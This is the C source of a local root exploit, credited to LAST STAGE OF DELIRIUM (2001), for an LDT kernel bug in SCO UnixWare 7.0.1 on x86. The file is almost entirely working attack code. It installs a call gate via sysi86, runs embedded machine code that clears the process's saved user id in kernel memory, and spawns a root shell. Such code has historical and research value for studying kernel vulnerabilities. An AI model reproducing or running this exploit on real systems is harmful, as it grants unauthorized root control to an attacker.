/*## copyright LAST STAGE OF DELIRIUM apr 2001 poland        *://lsd-pl.net/ #*/
/*## ldt kernel bug                                                          #*/

/*   the code installs trap call gate descriptor with DPL=3 targeting kernel  */
/*   code segment selector KCSSEL (DPL=0) in task local descriptor table LDT  */
/*   through sysi86(SI86DSCR,struct ssd*) system call.                        */

/*   as a result command shell is spawned with effective root user privilege. */
/*   NOTE: direct jump to user space possible adr=(unsigned int)&asmcode[21]; */

#include <sys/sysi86.h>
#include <sys/regset.h>
#define _KERNEL
#include <sys/types.h>
#include <sys/seg.h>
#include <sys/lwp.h>
#include <sys/cred.h>
#define MERGE386
#include <sys/user.h>
#undef _KERNEL
#include <ucontext.h>

#define ofs(s,m) (unsigned int)(&(((s*)0)->m))
#define ofslp()  (ofs(user_t,u_lwpp))
#define ofscr()  (ofs(lwp_t,l_cred))
#define ofsid()  (ofs(cred_t,cr_suid))
#define adr(a)   (char)(a),(char)(a>>8),(char)(a>>16),(char)(a>>24)

char asmcode[]={
    0x55,                      /* pushl   %ebp                   */
    0x89,0xe5,                 /* movl    %esp,%ebp              */
    0xe8,0,0,0,0,              /* call    <asmcode+8>            */ 
    0x5c,                      /* popl    %esp                   */
    0x83,0xc4,0x0d,            /* addl    $0x0d,%esp             */
    0x9a,0,0,0,0,0x44,0,       /* lcall   $0x44,$0x00000000      */
    0xc9,                      /* leave                          */
    0xc3,                      /* ret                            */

    0x2e,0xa1,adr(0x00000000), /* movl    (%cs:0x????????),%eax  */
    0x8b,0x80,adr(ofslp()),    /* movl    0x????????(%eax),%eax  */
    0x8b,0x88,adr(ofscr()),    /* movl    0x????????(%eax),%ecx  */
    0x31,0xc0,                 /* xorl    %eax,%eax              */
    0x89,0x41,ofsid(),         /* movl    %eax,0x??(%ecx)        */
    0xca,0x20,0                /* lret    $0x20                  */
};

main(int argc,char **argv){
    unsigned int adr;
    ucontext_t uc;struct ssd s;

    printf("copyright LAST STAGE OF DELIRIUM apr 2001 poland  //lsd-pl.net/\n");
    printf("ldt kernel bug for sco unixware 7.0.1 x86\n\n");

    getcontext(&uc);
    if(getksym("upointer",(unsigned int*)&asmcode[23],&adr)==-1) exit(-1);
    adr=uc.uc_mcontext.gregs[ESP]+0x01f4+12+4+4-(8<<2);

    printf("esp=0x%08x adr=0x%08x\n",uc.uc_mcontext.gregs[ESP],adr);

    s.bo=adr;
    s.sel=0x44;
    s.ls=KCSSEL;
    s.acc1=GATE_UACC|GATE_386CALL;
    s.acc2=8;

    sysi86(SI86DSCR,&s);
    ((void(*)())asmcode)();
    setreuid(-1,0);

    execl("/bin/ksh","lsd",0);
}

